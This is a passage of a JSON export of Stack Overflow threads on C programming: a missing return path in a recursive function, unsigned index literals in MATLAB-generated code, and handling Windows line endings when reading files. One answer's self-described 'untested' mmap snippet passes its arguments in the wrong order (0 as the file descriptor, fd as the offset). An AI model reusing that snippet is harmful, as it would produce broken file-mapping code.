"last_activity_date": 1499267720, "creation_date": 1499267720, "answer_id": 44930119, "question_id": 44930026, "link": "https://stackoverflow.com/questions/44930026/error-control-reaches-end-of-non-void-function/44930119#44930119", "title": "error: control reaches end of non-void function:(", "body": "<p>In the first snippet when <code>n</code> is odd, the function <code>sum_even_d</code> won't reach any <code>return</code> statement. But since the function is defined a non-void, it must return a value. This is what the compiler is telling you. In the second snippet your <code>else</code> statement is taking care of this code path. </p>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 0, "last_activity_date": 1499268002, "creation_date": 1499268002, "answer_id": 44930218, "question_id": 44930026, "link": "https://stackoverflow.com/questions/44930026/error-control-reaches-end-of-non-void-function/44930218#44930218", "title": "error: control reaches end of non-void function:(", "body": "<p>All possible paths of a function that do not have a return type of <code>void</code> <strong>must</strong> return a value.</p>\n\n<p>In your first piece of code, if the condition <code>if(n%2==0)</code> is false, the code runs to the end of the function but hasn't returned a value.  Back in the calling function, the return value is unknown because you didn't specify one.  This invoked undefined behavior.</p>\n\n<p>Your second code does return a value for all paths, so no error.</p>\n"}], "owner": {"reputation": 15, "user_id": 8260015, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d4f32028a86cc1a6c73dd7d78aaefc30?s=128&d=identicon&r=PG&f=1", "display_name": "doronbs11", "link": "https://stackoverflow.com/users/8260015/doronbs11"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2178, "favorite_count": 0, "closed_date": 1499271251, "answer_count": 3, "score": -1, "last_activity_date": 1499269132, "creation_date": 1499267464, "last_edit_date": 1499269132, "question_id": 44930026, "link": "https://stackoverflow.com/questions/44930026/error-control-reaches-end-of-non-void-function", "closed_reason": "Duplicate", "title": "error: control reaches end of non-void function:(", "body": "<p>I know this has been asked before but still I couldn't find a fix. The program is supposed to sum all even digits in a number using recursion. Here's the code that produces the error <code>control reaches end of non-void function</code>:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint sum_even_d(unsigned long n);\n\nint main()\n{\n    unsigned long n;\n    int x;\n    printf(\"Enter n : \\n\");\n    scanf(\"%lu\",&amp;n);\n    x=sum_even_d(n);\n    printf(\"%d\\n\",x);\n    return 0;\n\n}\n\nint sum_even_d(unsigned long n)\n{\n    if(n==0) return 0;\n    if(n%2==0)\n        return (sum_even_d(n/10)+n%10);//*error here*//\n}\n</code></pre>\n\n<p>If I add one line though, the program works perfectly. I don't understand what made the difference:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint sum_even_d(unsigned long n);\n\nint main()\n{\n    unsigned long n;\n    int x;\n    printf(\"Enter n : \\n\");\n    scanf(\"%lu\",&amp;n);\n    x=sum_even_d(n);\n    printf(\"%d\\n\",x);\n    return 0;\n\n    }\n\nint sum_even_d(unsigned long n)\n{\n    if(n==0) return 0;\n    if(n%2==0)\n        return (sum_even_d(n/10)+n%10);\n    else return (sum_even_d(n/10));//*added this*//\n}\n</code></pre>\n"}, {"tags": ["c", "matlab", "matlab-coder"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499266420, "post_id": 44929566, "comment_id": 76834865, "body": "The reason for spamming the C++ tag? And we are not an &quot;explain the code&quot; site. If you want to understand C, read a good C book."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1499266697, "post_id": 44929566, "comment_id": 76835105, "body": "@Olaf: if you are having a bad day, take some time off SO ;-)"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1499266770, "post_id": 44929566, "comment_id": 76835176, "body": "The literal <code>0</code> has the same value as <code>0U</code>, but differs in type -- the former has type <code>int</code>, whereas the latter has type <code>unsigned int</code>.  Since the value is the same, however, the type difference does not matter to the value&#39;s use as an array index.  That is, <code>A[0U]</code> is equivalent to <code>A[0]</code> and <code>f[1U]</code> is equivalent to <code>f[1]</code>.  MATLAB&#39;s code generator is just a little quirky."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1499267038, "post_id": 44929566, "comment_id": 76835390, "body": "@chqrlie: I have a fine day. It is just those people not reading rules or even taking the <a href=\"https://stackoverflow.com/tour\">tour</a> which shows up during final registration and asking obvious questions explained in every beginner&#39;s book."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1499267176, "post_id": 44929566, "comment_id": 76835507, "body": "@Olaf: the OP seems to know the meaning of the <code>U</code> suffix, he wonders why the code generator uses it, and frankly, so do I."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499267429, "post_id": 44929566, "comment_id": 76835704, "body": "@chqrlie: Learning C would help. <code>size_t</code> is the type which is guaranteed to hold all valid array indexes. And surprisingly, it is \u2026 unsigned. Both are explained in these paper-thingies (now also in electronic form)."}, {"owner": {"reputation": 65, "user_id": 7065078, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KCyZS.jpg?s=128&g=1", "display_name": "Vic Tor", "link": "https://stackoverflow.com/users/7065078/vic-tor"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1499269682, "post_id": 44929566, "comment_id": 76837311, "body": "Thanks @JohnBollinger for the answer, that the information I needed!"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499271962, "post_id": 44929566, "comment_id": 76838791, "body": "@chqrlie The automated code of <code>void function1(const double A[49], double B[50]) {   function2( (double *)&amp;A[0U] ); }</code> seems inconsistent.   If a <code>u</code> is append like <code>0U</code>, I&#39;d expect <code>49U</code> and <code>50U</code> too."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499273560, "post_id": 44929566, "comment_id": 76839744, "body": "@chux: You are correct, but I&#39;d be surprised if that was the only error. Also  for a declarator the type might not be that relevant like for the index-operator/addition."}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499267275, "post_id": 44929905, "comment_id": 76835581, "body": "<code>sizeof(2147483648) == sizeof(long) sizeof(2147483648U) == sizeof(unsigned)</code> - none of this is guaranteed. And they are often wrong."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499267694, "post_id": 44929905, "comment_id": 76835878, "body": "@Olaf: you are correct, neither of these are guaranteed, I amended my answer, but they are often true."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499268447, "post_id": 44929905, "comment_id": 76836415, "body": "Not really. For WIndows it is wrong and for all CPUs with <code>int</code> less than 32 bits which is the vast majority of systems."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499270126, "post_id": 44929905, "comment_id": 76837606, "body": "@Olaf: you are cranky, but correct. I amended the answer again. In terms of numbers of systems, I agree they are probably more systems out there with small ints, but in terms of numbers of programmers, there are probably more people programming for 32 and 64 bit systems than embedded targets."}, {"owner": {"reputation": 65, "user_id": 7065078, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KCyZS.jpg?s=128&g=1", "display_name": "Vic Tor", "link": "https://stackoverflow.com/users/7065078/vic-tor"}, "edited": false, "score": 0, "creation_date": 1499270593, "post_id": 44929905, "comment_id": 76837920, "body": "Thanks for the answer and the little examples, that answered my questions!"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499271131, "post_id": 44929905, "comment_id": 76838244, "body": "@chqrlie: Considering the number of different devices with embedded CPUs and Windows systems, I disagree. It <b>might</b> be different if we add programming languages like JavaScript and Java, but not for C. And as I wrote: For Windows, it is also not correct (for POSIX32 it is also wrong, btw.)."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499271298, "post_id": 44929905, "comment_id": 76838351, "body": "@Olaf: is my last edit still incorrect for the targets specified?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499271338, "post_id": 44929905, "comment_id": 76838387, "body": "@chqrlie: Unrelated; about the just deleted post you answered: We have at least one troll here. Sorry, I will not tell more, as he reads comments."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499271542, "post_id": 44929905, "comment_id": 76838523, "body": "You shouid add systems with 17, 18, etc bit <code>int</code>, too;-) Point is: what you write is completely unnecessary and not related to the question. Remember we are not a tutoring site; it should be just question-&gt;answer, no decoration. If you feel you have to &quot;blow up&quot; the text like that, I&#39;m likely correct the question is not suitable for this site."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 2, "last_activity_date": 1499269931, "last_edit_date": 1499269931, "creation_date": 1499267077, "answer_id": 44929905, "question_id": 44929566, "link": "https://stackoverflow.com/questions/44929566/operating-on-arrays-using-unsigned-values/44929905#44929905", "title": "Operating on arrays using Unsigned Values", "body": "<p>The <code>U</code> suffix is obviously not necessary here. It can be useful to force unsigned arithmetics in certain situations, with surprising side effects:</p>\n\n<pre><code>if (-1 &lt; 1U) {\n    printf(\"surprise!\\n\");\n}\n</code></pre>\n\n<p>In some rare occasions, it is necessary to avoid some type changes. On many current architectures, the following comparisons hold and the type of <code>2147483648</code> is different from that of <code>2147483648U</code> is more than just signedness:</p>\n\n<p>For example, on 32-bit linux and 32- and 64-bit windows:</p>\n\n<pre><code>sizeof(2147483648) == sizeof(long long)  // 8 bytes\nsizeof(2147483648U) == sizeof(unsigned)  // 4 bytes\n</code></pre>\n\n<p>On many embedded systems with 16-bit ints:</p>\n\n<pre><code>sizeof(2147483648) == sizeof(long long)       // 8 bytes\nsizeof(2147483648U) == sizeof(unsigned long)  // 4 bytes\nsizeof(32768) == sizeof(long)                 // 4 bytes\nsizeof(32768U) == sizeof(unsigned int)        // 2 bytes\n</code></pre>\n\n<p>Depending on implementation details, array index values can exceed the range of both type <code>int</code> and type <code>unsigned</code>, and pointer offset values can be even larger.  Just specifying <code>U</code> is no guarantee of anything.</p>\n"}, {"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1499271747, "post_id": 44931387, "comment_id": 76838659, "body": "UVd, you phrased it better than I did."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 2, "last_activity_date": 1499271553, "creation_date": 1499271553, "answer_id": 44931387, "question_id": 44929566, "link": "https://stackoverflow.com/questions/44929566/operating-on-arrays-using-unsigned-values/44931387#44931387", "title": "Operating on arrays using Unsigned Values", "body": "<p>For <code>a[n]</code>, array indexes are always non-negative values, from <code>0</code> to <code>n-1</code>.  Appending a <code>u</code> to a decimal constant poses no problem for indexing an array, yet does offer a benefit: it insures that the value is of minimal type width and of some <em>unsigned</em> type.</p>\n\n<p>Automated generation of a fixed index like with Matlab benefits by using a <code>u</code> suffix.  </p>\n\n<hr>\n\n<p>Consider small and large values on a 32-bit <code>unsigned/int/long/size_t</code> system</p>\n\n<pre><code>aweeu[0u];           // `0u` is 32-bit `unsigned`.\naweenou[0];          // `0` is 32-bit `int`.\nabigu[3000000000u];  // `3000000000u` is a 32-bit `unsigned`.\nabignou[3000000000]; // `3000000000` is a 64-bit `long long`.\n</code></pre>\n\n<hr>\n\n<p>Is this of value?  Perhaps.  Some compiles make look at the <em>value</em> first and see that all above are in range of <code>size_t</code> and not complain.  Others may complain about an index of type <code>long long</code> or possible even <code>int</code>.  By appending the <code>u</code>, such rare complaints do not occur.</p>\n"}], "owner": {"reputation": 65, "user_id": 7065078, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KCyZS.jpg?s=128&g=1", "display_name": "Vic Tor", "link": "https://stackoverflow.com/users/7065078/vic-tor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 159, "favorite_count": 0, "closed_date": 1499296184, "accepted_answer_id": 44931387, "answer_count": 2, "score": 3, "last_activity_date": 1499271553, "creation_date": 1499266190, "last_edit_date": 1499266435, "question_id": 44929566, "link": "https://stackoverflow.com/questions/44929566/operating-on-arrays-using-unsigned-values", "closed_reason": "Needs details or clarity", "title": "Operating on arrays using Unsigned Values", "body": "<p>I have been generating a C function from Matlab Coder environnement in order to implement it in an other software called MAX/MSP.\nI'm trying to make sense of it, thanks to my poor level in C programming, and there is some syntax elements I can't understand: the use of unsigned values like 0U or 1U to pass arrays. </p>\n\n<p>The next example doesn't do anything. Pasting the entire code wouldn't help much, unless you think so.</p>\n\n<pre><code>void function1(const double A[49], double B[50])\n{\n  function2( (double *)&amp;A[0U] );\n}\n\nstatic void function2(const double A[])\n{\n\n}\n</code></pre>\n\n<p>While doing some math, Matlab wrote something like:</p>\n\n<pre><code>b = 2;\nf[1U] += b;\n</code></pre>\n\n<p>I don't understand the use of unsigned value either...</p>\n\n<p>Thanks a lot!</p>\n"}, {"tags": ["c", "text-files", "fopen"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1499263369, "post_id": 44928378, "comment_id": 76832324, "body": "Will this run on a non-Windows system, where you sometime read Windows-formatted text files (with the Windows <code>&quot;\\r\\n&quot;</code> line ending)? If you run this <i>on</i> a Windows system with a file containing Windows line endings, then using binary mode will not translate the <code>&quot;\\r\\n&quot;</code> into plain <code>&quot;\\n&quot;</code>. If on the other hand you use this on a non-Windows system to read files <i>with</i> Windows line endings, then I suggest you handle them in the code that uses the text instead."}, {"owner": {"reputation": 877, "user_id": 1527152, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/70137d1d63d9196b42844848bcc6f11f?s=128&d=identicon&r=PG", "display_name": "user1527152", "link": "https://stackoverflow.com/users/1527152/user1527152"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499263981, "post_id": 44928378, "comment_id": 76832792, "body": "I updated my question to address your questions. Let me know if it is enough or if I should add more details."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499264044, "post_id": 44928378, "comment_id": 76832846, "body": "What kind of files is your program reading? Text files or binary (non text) files?"}, {"owner": {"reputation": 877, "user_id": 1527152, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/70137d1d63d9196b42844848bcc6f11f?s=128&d=identicon&r=PG", "display_name": "user1527152", "link": "https://stackoverflow.com/users/1527152/user1527152"}, "edited": false, "score": 0, "creation_date": 1499264132, "post_id": 44928378, "comment_id": 76832923, "body": "Both, sometimes there is some spreadsheets."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1499264618, "post_id": 44928378, "comment_id": 76833370, "body": "And you do not know in advance? Or could you guess by file ending? What, if you read in a true binary file that by accident contains the byte sequence &#39;\\r&#39;, &#39;\\n&#39;. If I imagine you dropped this from some .exe file..."}, {"owner": {"reputation": 877, "user_id": 1527152, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/70137d1d63d9196b42844848bcc6f11f?s=128&d=identicon&r=PG", "display_name": "user1527152", "link": "https://stackoverflow.com/users/1527152/user1527152"}, "edited": false, "score": 0, "creation_date": 1499264816, "post_id": 44928378, "comment_id": 76833534, "body": "Yeah no I don&#39;t. That&#39;s my problem, I realized that sometimes I have the windows line ending remaining and I am trying to figure out what is the best way to get rid of it. Now I wonder if my question is not clear enough"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499264859, "post_id": 44928378, "comment_id": 76833570, "body": "@user1527152 what are you doping with the files once they have been read into memory?"}, {"owner": {"reputation": 877, "user_id": 1527152, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/70137d1d63d9196b42844848bcc6f11f?s=128&d=identicon&r=PG", "display_name": "user1527152", "link": "https://stackoverflow.com/users/1527152/user1527152"}, "edited": false, "score": 0, "creation_date": 1499265082, "post_id": 44928378, "comment_id": 76833726, "body": "read line by line to process the information. it is supposed to be text (or csv) files but sometimes it is formatted in a spreasheet."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1499265470, "post_id": 44928378, "comment_id": 76834049, "body": "Related: <a href=\"https://stackoverflow.com/a/35178521/2402272\">How to read / parse input in C? The FAQ</a>."}], "answers": [{"comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1499264827, "post_id": 44928954, "comment_id": 76833543, "body": "That doesn&#39;t really answer the question."}, {"owner": {"reputation": 1056, "user_id": 4319483, "user_type": "registered", "profile_image": "https://graph.facebook.com/668992100/picture?type=large", "display_name": "Bjorn A.", "link": "https://stackoverflow.com/users/4319483/bjorn-a"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499264953, "post_id": 44928954, "comment_id": 76833632, "body": "Maybe, maybe not. The code does the same and eliminates the \\r\\n issue. So now the OP has one more option, which is good."}, {"owner": {"reputation": 1056, "user_id": 4319483, "user_type": "registered", "profile_image": "https://graph.facebook.com/668992100/picture?type=large", "display_name": "Bjorn A.", "link": "https://stackoverflow.com/users/4319483/bjorn-a"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499265786, "post_id": 44928954, "comment_id": 76834284, "body": "Meh, there&#39;s one difference, the zero terminator. So my alternative must return the length of the file too."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 1, "creation_date": 1499265952, "post_id": 44928954, "comment_id": 76834435, "body": "@BjornA. : How does it eliminate the <code>\\r\\n</code> issue?  The code will still need to cope with files containing either CR or CR+LF. (which is not that hard a problem in any case)."}, {"owner": {"reputation": 1056, "user_id": 4319483, "user_type": "registered", "profile_image": "https://graph.facebook.com/668992100/picture?type=large", "display_name": "Bjorn A.", "link": "https://stackoverflow.com/users/4319483/bjorn-a"}, "edited": false, "score": 0, "creation_date": 1499266389, "post_id": 44928954, "comment_id": 76834827, "body": "We don&#39;t have the full program available, so I&#39;m just guessing here. I assume that the buffer is read/parsed right after the file contents were copied into the buffer. The parser can handle \\r\\n, can&#39;t it? The parser can just ignore the \\r and &#39;detect&#39; newline when it finds a \\n. I&#39;m not sure, but I think sscanf() can be used to skip \\r (as it is white space anyway) and &#39;eat&#39; the \\n if \\n is present in the format string."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1499266817, "post_id": 44928954, "comment_id": 76835214, "body": "@BjornA. : That kind of my point - this is a comment on the method used to read the file, not an answer to the question of how to handle different text files.  I think the answer is just to us etext mode, the windows files will be stripped of CR.  If the files written back and used on Windows, there are few Windows applications that cannot cope with Linux text files. (Notepad being an exception!)."}, {"owner": {"reputation": 1056, "user_id": 4319483, "user_type": "registered", "profile_image": "https://graph.facebook.com/668992100/picture?type=large", "display_name": "Bjorn A.", "link": "https://stackoverflow.com/users/4319483/bjorn-a"}, "edited": false, "score": 0, "creation_date": 1499267228, "post_id": 44928954, "comment_id": 76835548, "body": "As I said, we&#39;re guessing here. :)  OP&#39;s snippet needed some love and I&#39;m pretty sure the rest of the program needs love too. Think of my reply as an outside-the-box approach with better, overall code as the end goal. Probably won&#39;t work.  The thing is, the b in &quot;rb&quot; is ignored on Linux and no autoconversion will occur. If OP wants to read files with different formats and line endings, OP&#39;s program must handle it itself."}], "tags": [], "owner": {"reputation": 1056, "user_id": 4319483, "user_type": "registered", "profile_image": "https://graph.facebook.com/668992100/picture?type=large", "display_name": "Bjorn A.", "link": "https://stackoverflow.com/users/4319483/bjorn-a"}, "is_accepted": false, "score": 0, "last_activity_date": 1499264693, "creation_date": 1499264693, "answer_id": 44928954, "question_id": 44928378, "link": "https://stackoverflow.com/questions/44928378/open-non-text-file-without-windows-line-ending/44928954#44928954", "title": "Open non text file without windows line ending", "body": "<p>The code just copies the contents of a file to an allocated buffer. The UNIX way (YMMV) is to just memory map the file instead of reading it. Much faster.</p>\n\n<pre><code>// untested code\nvoid* mapfile(const char *name)\n{\n    int fd;\n    struct stat st;\n\n    if ((fd = open(name, O_RDONLY)) == -1)\n        return NULL;\n    if (fstat(fd, &amp;st)) {\n        close(fd);\n        return NULL;\n    }\n\n    void *p = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, 0, fd);\n    close(fd);\n    if (p == (void *)MAP_FAILED)\n        p = NULL;\n\n    return p;\n} \n</code></pre>\n\n<p>Something along these lines will work. Adjust settings if you want to write to the file as well.</p>\n"}, {"comments": [{"owner": {"reputation": 877, "user_id": 1527152, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/70137d1d63d9196b42844848bcc6f11f?s=128&d=identicon&r=PG", "display_name": "user1527152", "link": "https://stackoverflow.com/users/1527152/user1527152"}, "edited": false, "score": 0, "creation_date": 